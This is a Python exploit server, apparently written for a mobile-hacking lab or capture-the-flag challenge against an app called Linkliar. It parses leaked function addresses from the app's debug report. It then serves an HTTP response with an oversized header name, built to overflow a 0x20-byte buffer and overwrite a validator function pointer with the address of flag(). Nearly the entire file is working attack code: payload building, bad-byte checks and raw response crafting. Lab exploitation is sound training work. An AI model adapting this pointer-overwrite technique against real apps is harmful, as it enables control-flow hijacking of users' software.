#!/usr/bin/env python3
"""
Linkliar chain server (MHL lab use only).

  POST /report  <- debug report from the app (leak), and later the flag POST
  GET  /scan    -> response with an oversized header NAME that overwrites
                   header_entry.validator (+0x20) with the leaked flag() address

Offline test:  python3 linkliar_srv.py --addr 0x102b04b80
               curl -s -i http://127.0.0.1:8000/scan | xxd | head
"""
import argparse
import json
import re
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

STATE = {"flag_addr": None}
HEX = re.compile(rb"0x[0-9a-fA-F]{16}")
# bytes that definitely break the header line (end it or split name/value)
BAD = {0x0A, 0x0D, ord(":")}
# bytes that may be rejected by a strict parser; 0x01 is always present
# (image base 0x1xxxxxxxx), so these are only a warning
SOFT = (set(range(0x00, 0x21)) | {0x7F}) - BAD
PAD = b"A" * 0x20  # name[0x20] buffer


def build_name(addr: int) -> bytes:
    """Padding + little-endian address bytes up to (not incl.) the first 0x00.
    The copy loop's NUL terminator writes that 0x00; higher bytes already match
    because headerValidator and flag live in the same image."""
    tail = bytearray()
    for b in addr.to_bytes(8, "little"):
        if b == 0:
            break
        tail.append(b)
    return PAD + bytes(tail)


def check_name(name: bytes) -> list:
    return [hex(b) for b in name[len(PAD):] if b in BAD]


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        sys.stderr.write("[%s] %s\n" % (self.client_address[0], fmt % args))

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(n)
        print(f"\n=== POST {self.path} ===")
        print(str(self.headers).strip())
        print(body.decode("latin-1"))

        try:
            data = json.loads(body)
        except ValueError:
            data = {}

        if isinstance(data, dict) and "flag" in data:
            print(f"\n******** FLAG RECEIVED: {data['flag']} ********\n")
        else:
            addrs = [int(m, 16) for m in HEX.findall(body)]
            if len(addrs) >= 2:
                hv, fl = addrs[0], addrs[1]
                print(f"[+] headerValidator = {hv:#018x}")
                print(f"[+] flag            = {fl:#018x}")
                if fl - hv != 0x40:
                    print("[!] delta is not 0x40, check the report order")
                STATE["flag_addr"] = fl
                name = build_name(fl)
                print("[+] header name tail:", name[len(PAD):].hex(" "))
                bad = check_name(name)
                soft = [hex(b) for b in name[len(PAD):] if b in SOFT]
                if bad:
                    print(f"[!] breaking bytes {bad}: relaunch the app and leak again")
                else:
                    if soft:
                        print(f"[~] control bytes {soft} (expected, CFNetwork must accept them)")
                    print("[+] trigger the scan deeplink now")

        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_GET(self):
        print(f"\n=== GET {self.path} ===")
        print(str(self.headers).strip())
        fl = STATE["flag_addr"]
        if fl is None:
            print("[!] no leak yet, send the debug deeplink first")
            self.send_response(503)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        name = build_name(fl)
        body = b"<html><body>totally safe page</body></html>"
        # Raw write so the header name bytes go out exactly as built
        resp = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: text/html\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n"
            b"Connection: close\r\n"
            + name + b": x\r\n"
            b"\r\n" + body
        )
        print("[+] sending header name:", name.hex(" "))
        self.wfile.write(resp)
        self.close_connection = True


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-p", "--port", type=int, default=8000)
    ap.add_argument("--addr", help="fake flag() address for offline testing")
    args = ap.parse_args()
    if args.addr:
        STATE["flag_addr"] = int(args.addr, 16)
        print(f"[*] offline mode, flag_addr = {STATE['flag_addr']:#018x}")
    print(f"[*] listening on 0.0.0.0:{args.port}")
    ThreadingHTTPServer(("0.0.0.0", args.port), Handler).serve_forever()


if __name__ == "__main__":
    main()
